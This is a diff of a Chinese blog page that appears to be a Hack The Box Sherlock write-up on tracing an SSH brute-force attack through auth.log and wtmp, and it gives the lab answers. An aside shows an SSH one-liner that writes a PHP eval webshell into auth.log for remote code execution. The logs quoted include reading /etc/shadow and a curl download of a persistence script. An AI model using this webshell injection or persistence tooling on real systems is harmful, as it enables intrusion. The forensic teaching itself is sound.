@@ -162,12 +162,9 @@
     <div class="content">
         <p><img src="/2025/01/21/HTB-Brutus/Brutus.png" alt="Brutus"></p>
 <figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Sherlock Scenario</span><br><span class="line"></span><br><span class="line">In this very easy Sherlock, you will familiarize yourself with Unix auth.log and wtmp logs. We&#x27;ll explore a scenario where a Confluence server was brute-forced via its SSH service. After gaining access to the server, the attacker performed additional activities, which we can track using auth.log. Although auth.log is primarily used for brute-force analysis, we will delve into the full potential of this artifact in our investigation, including aspects of privilege escalation, persistence, and even some visibility into command execution.</span><br></pre></td></tr></table></figure>
-<h2 id="tasks"><a class="markdownIt-Anchor" href="#tasks"></a> Tasks</h2>
-<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">1.</span> Analyzing the auth.log, can you identify the IP address used by the attacker to carry out a brute force attack?</span><br><span class="line"></span><br><span class="line"><span class="bullet">2.</span> The brute force attempts were successful, and the attacker gained access to an account on the server. What is the username of this account?</span><br><span class="line"></span><br><span class="line"><span class="bullet">3.</span> Can you identify the timestamp when the attacker manually logged in to the server to carry out their objectives?</span><br><span class="line"></span><br><span class="line"><span class="bullet">4.</span> SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker&#x27;s session for the user account from Question 2?</span><br><span class="line"></span><br><span class="line"><span class="bullet">5.</span> The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?</span><br><span class="line"></span><br><span class="line"><span class="bullet">6.</span> What is the MITRE ATT&amp;CK sub-technique ID used for persistence by creating a new account?</span><br><span class="line"></span><br><span class="line"><span class="bullet">7.</span> What time did the attacker&#x27;s first SSH session end according to auth.log?</span><br><span class="line"></span><br><span class="line"><span class="bullet">8.</span> The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?</span><br></pre></td></tr></table></figure>
-<h2 id="analysis"><a class="markdownIt-Anchor" href="#analysis"></a> Analysis</h2>
-<p>题目给出了两个附件一个<code>auth.log</code>，一个<code>wtmp</code>，先介绍一下这两个文件</p>
-<h3 id="authlog"><a class="markdownIt-Anchor" href="#authlog"></a> auth.log</h3>
-<p>用于记录所有与用户认证相关的日志，包括常见的SSH远程登录，利用sudo提升权限执行命令等都会产生记录</p>
+<h2 id="Tasks"><a href="#Tasks" class="headerlink" title="Tasks"></a>Tasks</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">1.</span> Analyzing the auth.log, can you identify the IP address used by the attacker to carry out a brute force attack?</span><br><span class="line"></span><br><span class="line"><span class="bullet">2.</span> The brute force attempts were successful, and the attacker gained access to an account on the server. What is the username of this account?</span><br><span class="line"></span><br><span class="line"><span class="bullet">3.</span> Can you identify the timestamp when the attacker manually logged in to the server to carry out their objectives?</span><br><span class="line"></span><br><span class="line"><span class="bullet">4.</span> SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker&#x27;s session for the user account from Question 2?</span><br><span class="line"></span><br><span class="line"><span class="bullet">5.</span> The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?</span><br><span class="line"></span><br><span class="line"><span class="bullet">6.</span> What is the MITRE ATT&amp;CK sub-technique ID used for persistence by creating a new account?</span><br><span class="line"></span><br><span class="line"><span class="bullet">7.</span> What time did the attacker&#x27;s first SSH session end according to auth.log?</span><br><span class="line"></span><br><span class="line"><span class="bullet">8.</span> The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?</span><br></pre></td></tr></table></figure>
+<h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>题目给出了两个附件一个<code>auth.log</code>，一个<code>wtmp</code>，先介绍一下这两个文件</p>
+<h3 id="auth-log"><a href="#auth-log" class="headerlink" title="auth.log"></a>auth.log</h3><p>用于记录所有与用户认证相关的日志，包括常见的SSH远程登录，利用sudo提升权限执行命令等都会产生记录</p>
 <p><strong>Debian/Ubuntu 系列位于</strong>:  <code>/var/log/auth.log</code></p>
 <p><strong>Red Hat/CentOS/Fedora系列位于</strong>: <code>/var/log/secure</code></p>
 <p>日志每行的格式如下</p>
@@ -175,23 +172,18 @@
 <p>我们取出一行数据进行对比</p>
 <figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mar  6 06:37:34 ip-172-31-35-28 sshd[2667]: Accepted password for cyberjunkie from 65.2.161.68 port 43260 ssh2</span><br></pre></td></tr></table></figure>
 <p>日志说明用户 <code>cyberjunkie</code> 从 <code>65.2.161.68</code> 通过 SSH 登录到名为 <code>ip-172-31-35-28</code> 的服务器，并成功通过密码认证。</p>
-<h4 id="常见事件类型"><a class="markdownIt-Anchor" href="#常见事件类型"></a> 常见事件类型</h4>
-<h5 id="ssh登录相关"><a class="markdownIt-Anchor" href="#ssh登录相关"></a> SSH登录相关</h5>
-<p><strong>成功</strong></p>
+<h4 id="常见事件类型"><a href="#常见事件类型" class="headerlink" title="常见事件类型"></a>常见事件类型</h4><h5 id="SSH登录相关"><a href="#SSH登录相关" class="headerlink" title="SSH登录相关"></a>SSH登录相关</h5><p><strong>成功</strong></p>
 <figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Accepted password for root from 65.2.161.68 port 53184 ssh2</span><br></pre></td></tr></table></figure>
 <p><strong>失败</strong></p>
 <figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Failed password for invalid user server<span class="emphasis">_adm from 65.2.161.68 port 46698 ssh2</span></span><br></pre></td></tr></table></figure>
 <p><strong>爆破</strong></p>
 <figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Failed password for root from 65.2.161.68 port 46852 ssh2</span><br><span class="line">Failed password for root from 65.2.161.68 port 46876 ssh2</span><br></pre></td></tr></table></figure>
-<h5 id="账户活动"><a class="markdownIt-Anchor" href="#账户活动"></a> 账户活动</h5>
-<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow</span><br></pre></td></tr></table></figure>
-<h5 id="系统服务认证"><a class="markdownIt-Anchor" href="#系统服务认证"></a> 系统服务认证</h5>
-<p><strong>登录会话开始</strong></p>
+<h5 id="账户活动"><a href="#账户活动" class="headerlink" title="账户活动"></a>账户活动</h5><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow</span><br></pre></td></tr></table></figure>
+<h5 id="系统服务认证"><a href="#系统服务认证" class="headerlink" title="系统服务认证"></a>系统服务认证</h5><p><strong>登录会话开始</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mar  6 06:18:01 ip-172-31-35-28 CRON[1119]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)</span><br></pre></td></tr></table></figure>
 <p><strong>登录会话结束</strong></p>
 <figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mar  6 06:18:01 ip-172-31-35-28 CRON[1118]: pam<span class="emphasis">_unix(cron:session): session closed for user confluence</span></span><br></pre></td></tr></table></figure>
-<h4 id="筛选安全事件"><a class="markdownIt-Anchor" href="#筛选安全事件"></a> 筛选安全事件</h4>
-<p>其实从上面的不同事件的分析中就已经可以很轻松的提取出关键词进行筛选了，下面仅给出简单的示例</p>
+<h4 id="筛选安全事件"><a href="#筛选安全事件" class="headerlink" title="筛选安全事件"></a>筛选安全事件</h4><p>其实从上面的不同事件的分析中就已经可以很轻松的提取出关键词进行筛选了，下面仅给出简单的示例</p>
 <p><strong>筛选登录失败的记录</strong></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="string">&quot;Failed password&quot;</span> /var/log/auth.log</span><br></pre></td></tr></table></figure>
 <p><strong>筛选登录成功记录</strong></p>
@@ -201,8 +193,7 @@
 <p>我们的log文件默认只有root账户可以访问，如果日志可读我们可以实现RCE，利用SSH可以实现向日志中写马</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh <span class="string">&#x27;&lt;?php @eval($_POST[&#x27;</span>attack<span class="string">&#x27;]);?&gt;&#x27;</span>@192.168.3.100</span><br></pre></td></tr></table></figure>
 <p>然后读取日志利用attack这个参数值实现RCE即可</p>
-<h3 id="wtmp"><a class="markdownIt-Anchor" href="#wtmp"></a> wtmp</h3>
-<p>说到<code>wtmp</code>文件就不得不提到另外两个文件了，<code>utmp</code>和<code>btmp</code></p>
+<h3 id="wtmp"><a href="#wtmp" class="headerlink" title="wtmp"></a>wtmp</h3><p>说到<code>wtmp</code>文件就不得不提到另外两个文件了，<code>utmp</code>和<code>btmp</code></p>
 <p>说一下三者的区别</p>
 <p><code>wtmp</code>：是一个二进制文件，永久记录每个用户登录、注销及系统的启动、停机的事件。位于<code>/var/log/wtmp</code></p>
 <p>读取<code>wtmp</code>文件</p>
@@ -238,48 +229,40 @@
 </ul>
 </blockquote>
 <p>题目的日志记录还是比较少的，我们直接使用Notepad即可，</p>
-<h3 id="task1"><a class="markdownIt-Anchor" href="#task1"></a> Task1</h3>
-<p>攻击者IP很简单，直接找Failed的记录就行了</p>
-<p><img src="/2025/01/21/HTB-Brutus/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250121194804.png" alt="微信截图_20250121194804"></p>
+<h3 id="Task1"><a href="#Task1" class="headerlink" title="Task1"></a>Task1</h3><p>攻击者IP很简单，直接找Failed的记录就行了</p>
+<p><img src="/2025/01/21/HTB-Brutus/微信截图_20250121194804.png" alt="微信截图_20250121194804"></p>
 <p><strong>Answer：65.2.161.68</strong></p>
-<h3 id="task2"><a class="markdownIt-Anchor" href="#task2"></a> Task2</h3>
-<p>爆破成功的用户直接找Accept即可</p>
-<p><img src="/2025/01/21/HTB-Brutus/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250121194958.png" alt="微信截图_20250121194958"></p>
+<h3 id="Task2"><a href="#Task2" class="headerlink" title="Task2"></a>Task2</h3><p>爆破成功的用户直接找Accept即可</p>
+<p><img src="/2025/01/21/HTB-Brutus/微信截图_20250121194958.png" alt="微信截图_20250121194958"></p>
 <p>发现存在4次记录，第一次应该正常的用户登录，紧接着最近的一次成功记录就是我们要找的爆破成功记录，用户是root</p>
 <p><strong>Answer：root</strong></p>
-<h3 id="task3"><a class="markdownIt-Anchor" href="#task3"></a> Task3</h3>
-<p>我们需要查找攻击者手动登录的时间戳，为什么会存在手动登录这一说法呢，我们先看下图</p>
-<p><img src="/2025/01/21/HTB-Brutus/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250121195423.png" alt="微信截图_20250121195423"></p>
+<h3 id="Task3"><a href="#Task3" class="headerlink" title="Task3"></a>Task3</h3><p>我们需要查找攻击者手动登录的时间戳，为什么会存在手动登录这一说法呢，我们先看下图</p>
+<p><img src="/2025/01/21/HTB-Brutus/微信截图_20250121195423.png" alt="微信截图_20250121195423"></p>
 <p>我们发现登陆成功和会话被移除时间间隔甚至不到一秒钟，这是因为暴力破解工具只检查登陆成功或失败的状态，然后记录成功的情况供攻击者稍后进行尝试。那么接下来我们只需要寻找下一次root账户的登录时间即可，这里我们也可以通过<code>wtmp</code>文件进行辅助</p>
-<p><img src="/2025/01/21/HTB-Brutus/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250121200045.png" alt="微信截图_20250121200045"></p>
+<p><img src="/2025/01/21/HTB-Brutus/微信截图_20250121200045.png" alt="微信截图_20250121200045"></p>
 <blockquote>
 <p><strong>注</strong>：请注意这里的时间虽然和<code>auth.log</code>的内容稍有出入，但是实际上也是正确的，只是小时因为时区的问题会比<code>auth.log</code>中快上几小时</p>
 </blockquote>
 <p>可以发现从SSH开始验证用户身份的合法性到成功登录之间存在一秒钟的差别，这是正常现象，因为验证<code>/etc/shadow</code>文件中的哈希和启动交互式会话均需要花费时间</p>
-<p><img src="/2025/01/21/HTB-Brutus/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250121200632.png" alt="微信截图_20250121200632"></p>
+<p><img src="/2025/01/21/HTB-Brutus/微信截图_20250121200632.png" alt="微信截图_20250121200632"></p>
 <p>这里的时间以<code>wtmp</code>文件中的为准</p>
 <p><strong>Answer: 2024-03-06 06:32:45</strong></p>
-<h3 id="task4"><a class="markdownIt-Anchor" href="#task4"></a> Task4</h3>
-<p>手动登陆时分配的会话号在登录日志里有</p>
-<p><img src="/2025/01/21/HTB-Brutus/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250121201144.png" alt="微信截图_20250121201144"></p>
+<h3 id="Task4"><a href="#Task4" class="headerlink" title="Task4"></a>Task4</h3><p>手动登陆时分配的会话号在登录日志里有</p>
+<p><img src="/2025/01/21/HTB-Brutus/微信截图_20250121201144.png" alt="微信截图_20250121201144"></p>
 <p><strong>Answer：37</strong></p>
-<h3 id="task5"><a class="markdownIt-Anchor" href="#task5"></a> Task5</h3>
-<p>为了实现权限持久化，攻击者创建了后门账户，我们在登陆后的账户活动中可以发现端倪</p>
-<p><img src="/2025/01/21/HTB-Brutus/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250121201706.png" alt="微信截图_20250121201706"></p>
+<h3 id="Task5"><a href="#Task5" class="headerlink" title="Task5"></a>Task5</h3><p>为了实现权限持久化，攻击者创建了后门账户，我们在登陆后的账户活动中可以发现端倪</p>
+<p><img src="/2025/01/21/HTB-Brutus/微信截图_20250121201706.png" alt="微信截图_20250121201706"></p>
 <p>添加cyberjunkie到sudo组中，并授予其对<code>/etc/shadow</code>文件的访问权限</p>
-<p><img src="/2025/01/21/HTB-Brutus/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250121201819.png" alt="微信截图_20250121201819"></p>
+<p><img src="/2025/01/21/HTB-Brutus/微信截图_20250121201819.png" alt="微信截图_20250121201819"></p>
 <p><strong>Answer：cyberjunkie</strong></p>
-<h3 id="task6"><a class="markdownIt-Anchor" href="#task6"></a> Task6</h3>
-<p>用于持久化的MITRE ATT&amp;CK子技术 ID直接在MITRE ATT&amp;CK官网上查就行了</p>
-<p><img src="/2025/01/21/HTB-Brutus/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250121204220.png" alt="微信截图_20250121204220"></p>
+<h3 id="Task6"><a href="#Task6" class="headerlink" title="Task6"></a>Task6</h3><p>用于持久化的MITRE ATT&amp;CK子技术 ID直接在MITRE ATT&amp;CK官网上查就行了</p>
+<p><img src="/2025/01/21/HTB-Brutus/微信截图_20250121204220.png" alt="微信截图_20250121204220"></p>
 <p><strong>Answer: T1136.001</strong></p>
-<h3 id="task7"><a class="markdownIt-Anchor" href="#task7"></a> Task7</h3>
-<p>根据 auth.log，攻击者的第一个 SSH 会话何时结束</p>
-<p><img src="/2025/01/21/HTB-Brutus/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250121204333.png" alt="微信截图_20250121204333"></p>
+<h3 id="Task7"><a href="#Task7" class="headerlink" title="Task7"></a>Task7</h3><p>根据 auth.log，攻击者的第一个 SSH 会话何时结束</p>
+<p><img src="/2025/01/21/HTB-Brutus/微信截图_20250121204333.png" alt="微信截图_20250121204333"></p>
 <p><strong>Answer：2024-03-06 06:37:24</strong></p>
-<h3 id="task8"><a class="markdownIt-Anchor" href="#task8"></a> Task8</h3>
-<p>攻击者在后门账户上利用高权限下载脚本的完整命令</p>
-<p><img src="/2025/01/21/HTB-Brutus/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250121204713.png" alt="微信截图_20250121204713"></p>
+<h3 id="Task8"><a href="#Task8" class="headerlink" title="Task8"></a>Task8</h3><p>攻击者在后门账户上利用高权限下载脚本的完整命令</p>
+<p><img src="/2025/01/21/HTB-Brutus/微信截图_20250121204713.png" alt="微信截图_20250121204713"></p>
 <p><strong>Answer：/usr/bin/curl <a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh">https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh</a></strong></p>
 
     </div>
@@ -416,7 +399,6 @@
             all[i].SourceElement().parentNode.className += ' has-jax';
     });
 </script>
-<script src="//cdn.bootcss.com/mathjax/2.7.3/MathJax.js?config=TeX-MML-AM_CHTML"></script>
-
+<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
 </body>
 </html>
